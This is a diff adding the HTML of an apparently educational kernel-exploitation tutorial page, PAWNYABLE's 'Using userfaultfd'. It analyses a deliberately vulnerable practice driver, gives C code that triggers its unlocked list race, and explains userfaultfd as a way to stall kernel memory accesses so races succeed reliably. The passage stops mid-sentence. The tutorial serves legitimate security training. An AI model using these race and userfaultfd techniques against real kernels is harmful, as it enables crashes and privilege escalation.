@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta name="og:url" content="https://pawnyable.cafe//en/linux-kernel/LK04/uffd.html">
+
+    <meta name="og:title" content="Using userfaultfd - PAWNYABLE!">
+
+<meta name="og:image" content="https://pawnyable.cafe/pawnyable.ogp.png">
+<meta name="og:description" content="もふもふpwnワールド">
+<meta name="og:type" content="website">
+<meta name="og:site_name" content="PAWNYABLE!">
+
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ptr-yudai">
+
+
+    <meta name="subtitle" content="pawnyable">
+
+
+    <meta name="description" content="Let's learn pwnable with cute animals.">
+
+
+    <meta name="keywords" content="linux,windows,kernel,browser,vm,exploit,exploitation,binary exploit,pwn,pwnable">
+
+
+
+
+<title>Using userfaultfd | PAWNYABLE!</title>
+
+
+
+    <link rel="icon" href="/favicon.png">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+  <style type="text/css">
+.spoiler {
+  display: inline;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><meta name="generator" content="Hexo 5.4.2"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      
+<div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/en/">PAWNYABLE</a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/en/practice/">Practice</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/en/about/">About</a>
+              </li> 
+                   
+          
+        </ul>
+      </nav>
+      
+<div class="language-switcher">
+  
+    
+      <a class="language-link" href="/linux-kernel/LK04/uffd">JA</a>
+    
+  
+    
+      <a class="language-link language-link-active" href="/en/linux-kernel/LK04/uffd">EN</a>
+    
+  
+    
+      <a class="language-link" href="/kr/linux-kernel/LK04/uffd">KR</a>
+    
+  
+</div>
+
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    
+<div class="post-head">
+    <div class="post-info">
+        <div class="post-title">
+            
+                Using userfaultfd
+                        
+        </div>
+    </div>
+    <div class="h-line-primary"></div>
+    
+<div class="language-switcher">
+  
+    
+      <a class="language-link" href="/linux-kernel/LK04/uffd">JA</a>
+    
+  
+    
+      <a class="language-link language-link-active" href="/en/linux-kernel/LK04/uffd">EN</a>
+    
+  
+    
+      <a class="language-link" href="/kr/linux-kernel/LK04/uffd">KR</a>
+    
+  
+</div>
+
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="../LK03/double_fetch.html">Previous</a></div>
+            <div class="pagination-index"><a href="../index.html">Contents</a></div>
+            <div class="pagination-fd"><a href="fuse.html">Next</a></div>
+        </div>
+    
+    
+        <div class="column" title="Table of Contents">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Inspecting-the-driver"><span class="toc-text">Inspecting the driver</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Confirming-the-bug"><span class="toc-text">Confirming the bug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-userfaultfd"><span class="toc-text">What is userfaultfd?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-use-of-userfaultfd"><span class="toc-text">Example use of userfaultfd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stabilizing-the-race"><span class="toc-text">Stabilizing the race</span></a></li></ol>
+        </div>
+    
+</div>
+
+    <div class="post-content">
+    <p>In LK04 (Fleckvieh), we handle a race condition similar to the one studied in LK01-4 (Holstein v4), but under stricter conditions. First, download the files for <a href="distfiles/LK04.tar.gz">practice problem LK04</a>.</p>
+<h2 id="Inspecting-the-driver">Inspecting the driver</h2>
+<p>First, read the driver source code. This time the driver is larger than the previous ones and uses features and syntax we have not seen before. <code>module_open</code> looks like this:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span> &#123;</span><br><span class="line">  <span class="comment">/* Allocate list head */</span></span><br><span class="line">  filp-&gt;private_data = (<span class="type">void</span>*)kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> list_head), GFP_KERNEL);</span><br><span class="line">  <span class="keyword">if</span> (unlikely(!filp-&gt;private_data))</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">  INIT_LIST_HEAD((<span class="keyword">struct</span> list_head*)filp-&gt;private_data);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>First, notice the <code>unlikely</code> macro on line 4. In the Linux kernel it is <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.16.14/source/include/linux/compiler.h#L77">defined like this</a>, and you will see it very often.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> likely(x)      __builtin_expect(!!(x), 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlikely(x)    __builtin_expect(!!(x), 0)</span></span><br></pre></td></tr></table></figure>
+<p>It lets the compiler know which side of a branch is more likely to be taken, for example in security checks or out-of-memory handling where one path is rarely executed. If the prediction is accurate, <code>likely</code>/<code>unlikely</code> can improve performance on hot paths.</p>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_suyasuya.png" alt="Wolf" ></div>
+  <p class="says">
+    If you give the compiler a hint, it can reduce the instruction count or branch count on the common path.
+    This also relates to CPU branch prediction, so look it up if you are curious.
+  </p>
+</div>
+<p>Next, line 7 uses the <code>INIT_LIST_HEAD</code> macro. This initializes a <code>list_head</code>, the doubly linked list structure that also appeared with <code>tty_struct</code>. The driver stores this structure in <code>private_data</code> so that each opened file descriptor has its own list.<br>
+The list stores <code>blob_list</code> objects:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> id;</span><br><span class="line">  <span class="type">size_t</span> size;</span><br><span class="line">  <span class="type">char</span> *data;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125; blob_list;</span><br></pre></td></tr></table></figure>
+<p>Items are inserted with <code>list_add</code>, removed with <code>list_del</code>, and iterated with helpers such as <code>list_for_each_entry(_safe)</code>. Look up the details as needed.</p>
+<p>If you read the <code>ioctl</code> implementation, you will see that the module supports four commands: <code>CMD_ADD</code>, <code>CMD_DEL</code>, <code>CMD_GET</code>, and <code>CMD_SET</code>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">module_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp,</span></span><br><span class="line"><span class="params">                         <span class="type">unsigned</span> <span class="type">int</span> cmd,</span></span><br><span class="line"><span class="params">                         <span class="type">unsigned</span> <span class="type">long</span> arg)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">top</span>;</span></span><br><span class="line">  <span class="type">request_t</span> req;</span><br><span class="line">  <span class="keyword">if</span> (unlikely(copy_from_user(&amp;req, (<span class="type">void</span>*)arg, <span class="keyword">sizeof</span>(req))))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  top = (<span class="keyword">struct</span> list_head*)filp-&gt;private_data;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> CMD_ADD: <span class="keyword">return</span> blob_add(top, &amp;req);</span><br><span class="line">    <span class="keyword">case</span> CMD_DEL: <span class="keyword">return</span> blob_del(top, &amp;req);</span><br><span class="line">    <span class="keyword">case</span> CMD_GET: <span class="keyword">return</span> blob_get(top, &amp;req);</span><br><span class="line">    <span class="keyword">case</span> CMD_SET: <span class="keyword">return</span> blob_set(top, &amp;req);</span><br><span class="line">    <span class="keyword">default</span>: <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>CMD_ADD</code> appends a <code>blob_list</code> to the list. Each <code>blob_list</code> contains up to 0x1000 bytes of data, and the contents are user-controlled. When a blob is added, it receives a random ID, which is returned to user space as the <code>ioctl</code> return value. The user then refers to that ID in later operations.<br>
+<code>CMD_DEL</code> deletes the corresponding <code>blob_list</code> when given an ID.<br>
+<code>CMD_GET</code> copies data from the matching <code>blob_list</code> into a user buffer using the specified ID, buffer, and size.<br>
+Finally, <code>CMD_SET</code> copies data from user space into the matching <code>blob_list</code>.</p>
+<p>Like previous modules, this driver stores user data, but Fleckvieh manages it with a list, so it can hold multiple items at once.</p>
+<h2 id="Confirming-the-bug">Confirming the bug</h2>
+<p>If you studied all of LK01, the vulnerability is obvious. There is no locking anywhere, so data races are easy to create. However, exploiting this race introduces a problem.<br>
+Because the data is managed through the relatively complex doubly linked list structure, trying to read or write data while another thread deletes it may hit the unlink path itself, corrupting the links or the heap state. Then you end up with crashes during the race, or with no reliable way to tell whether you actually created a Use-after-Free.<br>
+Let’s verify that by writing a race.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">char</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="type">request_t</span> req = &#123; .size = size, .data = data &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_ADD, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">del</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">  <span class="type">request_t</span> req = &#123; .id = id &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_DEL, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> id, <span class="type">char</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="type">request_t</span> req = &#123; .id = id, .size = size, .data = data &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_GET, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> id, <span class="type">char</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="type">request_t</span> req = &#123; .id = id, .size = size, .data = data &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_SET, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> race_win;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">race</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="type">int</span> id;</span><br><span class="line">  <span class="keyword">while</span> (!race_win) &#123;</span><br><span class="line">    id = add(<span class="string">&quot;Hello&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    del(id);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/fleckvieh&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/fleckvieh&quot;</span>);</span><br><span class="line"></span><br><span class="line">  race_win = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">pthread_t</span> th;</span><br><span class="line">  pthread_create(&amp;th, <span class="literal">NULL</span>, race, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> id;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++) &#123;</span><br><span class="line">    id = add(<span class="string">&quot;Hello&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    del(id);</span><br><span class="line">  &#125;</span><br><span class="line">  race_win = <span class="number">1</span>;</span><br><span class="line">  pthread_join(th, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>This code repeatedly adds and deletes data from multiple threads. If the race triggers, the links in the doubly linked list become corrupted, and the final <code>close</code> crashes while freeing the list contents.</p>
+<p>So does that mean races on complex data structures are impossible to exploit?</p>
+<h2 id="What-is-userfaultfd">What is userfaultfd?</h2>
+<p>To exploit races under complex conditions like this, or to raise the success probability of a race to nearly 100%, there is a technique that abuses a Linux feature called <strong>userfaultfd</strong>.</p>
+<p>If Linux is built with <code>CONFIG_USERFAULTFD</code>, the <code>userfaultfd</code> feature becomes available. userfaultfd is a system call that lets user space handle page faults.</p>
+<p>For a user without <code>CAP_SYS_PTRACE</code> to use <code>userfaultfd</code> with all permissions, the <code>unprivileged_userfaultfd</code> flag must be 1. This flag is exposed through <code>/proc/sys/vm/unprivileged_userfaultfd</code>. Its default is 0, but on the LK04 machine it is set to 1.</p>
+<p>The user receives a file descriptor from the <code>userfaultfd</code> syscall, then configures handlers and address ranges through <code>ioctl</code>. When a page fault occurs in a registered page (that is, on first access), the configured handler is invoked, and user space decides what backing data should be supplied for that page. The overall flow looks like this:</p>
+<center>
+  <img src="img/uffd.png" alt="Processing flow of userfaultfd" style="width:720px;">
+</center>
+<p>When a page fault occurs, the registered user-space handler runs. That means the thread that tried to read the page blocks until another thread running the handler supplies data. The same applies even when the page access originated from kernel space, so we can suspend kernel execution precisely at a memory read or write.</p>
+<h2 id="Example-use-of-userfaultfd">Example use of userfaultfd</h2>
+<p>Let’s try the following code:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fatal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="type">char</span> *dummy_page;</span><br><span class="line">  <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">copy</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">  <span class="type">long</span> uffd;</span><br><span class="line">  <span class="type">static</span> <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  uffd = (<span class="type">long</span>)arg;</span><br><span class="line"></span><br><span class="line">  dummy_page = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                    MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (dummy_page == MAP_FAILED) fatal(<span class="string">&quot;mmap(dummy)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] fault_handler_thread: waiting for page fault...&quot;</span>);</span><br><span class="line">  pollfd.fd = uffd;</span><br><span class="line">  pollfd.events = POLLIN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pollfd.revents &amp; POLLERR || pollfd.revents &amp; POLLHUP)</span><br><span class="line">      fatal(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* wait for a page fault */</span></span><br><span class="line">    <span class="keyword">if</span> (read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg)) &lt;= <span class="number">0</span>) fatal(<span class="string">&quot;read(uffd)&quot;</span>);</span><br><span class="line">    assert (msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] uffd: flag=0x%llx\n&quot;</span>, msg.arg.pagefault.flags);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] uffd: addr=0x%llx\n&quot;</span>, msg.arg.pagefault.address);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* choose the data returned for the requested page */</span></span><br><span class="line">    <span class="keyword">if</span> (fault_cnt++ == <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">strcpy</span>(dummy_page, <span class="string">&quot;Hello, World! (1)&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">strcpy</span>(dummy_page, <span class="string">&quot;Hello, World! (2)&quot;</span>);</span><br><span class="line">    copy.src = (<span class="type">unsigned</span> <span class="type">long</span>)dummy_page;</span><br><span class="line">    copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~<span class="number">0xfff</span>;</span><br><span class="line">    copy.len = <span class="number">0x1000</span>;</span><br><span class="line">    copy.mode = <span class="number">0</span>;</span><br><span class="line">    copy.copy = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;copy) == <span class="number">-1</span>) fatal(<span class="string">&quot;ioctl(UFFDIO_COPY)&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">register_uffd</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">  <span class="type">long</span> uffd;</span><br><span class="line">  <span class="type">pthread_t</span> th;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* create a userfaultfd */</span></span><br><span class="line">  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">  <span class="keyword">if</span> (uffd == <span class="number">-1</span>) fatal(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">  uffdio_api.api = UFFD_API;</span><br><span class="line">  uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">    fatal(<span class="string">&quot;ioctl(UFFDIO_API)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* register the pages */</span></span><br><span class="line">  uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)addr;</span><br><span class="line">  uffdio_register.range.len = len;</span><br><span class="line">  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">  <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">    fatal(<span class="string">&quot;UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* create a thread that handles page faults */</span></span><br><span class="line">  <span class="keyword">if</span> (pthread_create(&amp;th, <span class="literal">NULL</span>, fault_handler_thread, (<span class="type">void</span>*)uffd))</span><br><span class="line">    fatal(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">void</span> *page;</span><br><span class="line">  page = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">              MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (page == MAP_FAILED) fatal(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">  register_uffd(page, <span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* use printf carefully because puts/futex in the thread can hang */</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, (<span class="type">char</span>*)(page));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0x0000: %s\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, (<span class="type">char</span>*)(page + <span class="number">0x1000</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0x1000: %s\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, (<span class="type">char</span>*)(page));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0x0000: %s\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, (<span class="type">char</span>*)(page + <span class="number">0x1000</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0x1000: %s\n&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>This code passes a page address and length to <code>register_uffd</code>. That function spawns a handler thread called <code>fault_handler_thread</code>.<br>
